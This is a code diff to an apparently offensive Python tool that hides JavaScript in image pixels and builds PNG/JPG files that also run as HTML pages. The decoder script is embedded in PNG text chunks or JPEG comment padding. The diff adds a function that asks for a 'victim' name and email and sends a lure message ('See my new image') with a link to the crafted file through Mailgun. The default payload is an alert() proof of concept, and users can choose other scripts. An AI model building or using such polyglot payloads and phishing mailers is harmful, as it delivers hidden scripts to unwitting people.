@@ -28,9 +28,9 @@ def set_tollerance():
 	if bL < 2:
 		tollerance=0
 	elif bL == 2:
-		tollerance=1
-	else:
-		tollerance=3
+		tollerance = 1
+	elif bL > 2:
+		tollerance = 2
 
 def find_possible_rgb(bl):
 	global arr_0
@@ -235,13 +235,10 @@ def encode(image):
 def html_in_png():
     html_file = open("decoder_simple.html","r")
     html_data = html_file.read().replace('\n', '').replace('\r', '')
-    
     html_data = html_data.replace('bL=0','bL='+str(bL))
     html_data = html_data.replace('message_len=0','message_len='+str(message_len))
-    
     html_data = " -->" + html_data + "<script type='text/undefined'>/*"
     html_file.close()
-
     padding_length = random.randrange(1900);
     for i in range(padding_length):
     	while(1):
@@ -249,7 +246,6 @@ def html_in_png():
         	if x >= 32 and x != 0 and x != ord('<') and x != ord('>') and x != ord('/'):
         		break
         html_data = chr(x) + html_data;
-
     meta = PngImagePlugin.PngInfo()
     meta.add_text("<html>", "<!--")
     meta.add_text("_",html_data)
@@ -261,26 +257,19 @@ def html_in_jpg():
 	in_file = open(args.outimage,"rb")
 	r = in_file.read()
 	in_file.close()
-
 	html_file = open("decoder_simple.html","rb")
 	html_data = html_file.read().replace('\n', '').replace('\r', '')
 	html_data = html_data.replace('bL=0','bL='+str(bL))
 	html_data = html_data.replace('message_len=0','message_len='+str(message_len))
 	html_file.close()
-
 	jpg_start = r[0:4]
 	jfif_app0 = r[6:20]
 	rest_of_jpg = r[20:]
-
 	html = "<html><!-- ";
 	content = " -->";
-
 	content += html_data + "<!--";
-
 	padding_length = 0x2f2a - len(content) - len(html); #12074 = 0x2f2a = /*
-
 	random_length = random.randrange(1900);
-
 	padding = "";
 	for i in range(padding_length):
 		while(1):
@@ -288,14 +277,10 @@ def html_in_jpg():
 			if x != 0 and x != ord('<') and x != ord('>') and x != ord('/'): #verifico che il char generato sia diverso da 0,<,>,/ in quanto potrebbe commentare parte del codice essenziale
 				break
 	   	padding += chr(x)
-
 	pre_padding = padding[0:random_length]
 	post_padding = padding[random_length:]
-
 	final_content = html + pre_padding + content + post_padding;
-
 	new_jpg = jpg_start + "/*" + jfif_app0 + final_content + rest_of_jpg + "*/ -->";
-
 	out_file = open("output","wb")
 	out_file.write(new_jpg)
 	out_file.close()
@@ -308,7 +293,7 @@ def select_code(file):
 	if len(lines)>0:
 		print bcolors.OKGREEN+"\n[ ] SELECT CODE"+bcolors.ENDC
 		for l in range(len(lines)):
-			print str(l)+") "+lines[l]
+			print bcolors.BOLD+str(l)+") "+bcolors.ENDC+lines[l]
 		select = raw_input(": ")
 		try:
 			message = lines[int(select)]
@@ -319,15 +304,28 @@ def select_code(file):
 	else:
 		print bcolors.WARNING+"[-] FILE OF CODES IS EMPTY - USE DEFAULT CODE\n"+bcolors.ENDC
 
+def send_email():
+	res = raw_input(bcolors.OKGREEN+"[ ] Do you want to send a mail to victim? (Y/N):"+bcolors.ENDC)
+	if res=="Y" or res=="y":
+		import requests
+		name = raw_input(bcolors.OKGREEN+"[ ] Insert victim name: "+bcolors.ENDC)
+		email = raw_input(bcolors.OKGREEN+"[ ] Insert victim mail: "+bcolors.ENDC)
+		link = "YOURIP/output"
+		if requests.post("https://api.mailgun.net/v3/sandbox5afec98e51c9475bb11d601f0d1ce750.mailgun.org/messages",auth=("api", "key-yourkey"),data={"from": "Your Best Friend Foo <foo@boo.com>","to": name+" <"+email+">","subject": "Hello Friend!","text": "See my new image: "+link}):
+			print bcolors.OKBLUE+"[+] SENDED"+bcolors.ENDC
+	print bcolors.WARNING+"[ ] EXIT..."+bcolors.ENDC
 if __name__ == "__main__":
-	message = "alert('work');//"
+
+	message = "alert('WORK!');//"
 	message_len = len(message)
 	trying = 0
 	bL = int(args.bitlayer)
 	modified_pixel = 0
 	arr_original_pixel = []
 	arr_last_modified_pixel = []
+
 	print bcolors.OKGREEN+"\n[ ] STARTED..."+bcolors.ENDC
+
 	ext3 = args.outimage[len(args.outimage)-3:len(args.outimage)]
 	ext4 = args.outimage[len(args.outimage)-4:len(args.outimage)]
 	ext = ""
@@ -341,5 +339,7 @@ if __name__ == "__main__":
 	elif ext3=="png" or ext3=="PNG":
 		ext = "PNG"
 		adjust_alpha()
+
 	select_code("codes.txt")
 	encode(args.image)
+	send_email()
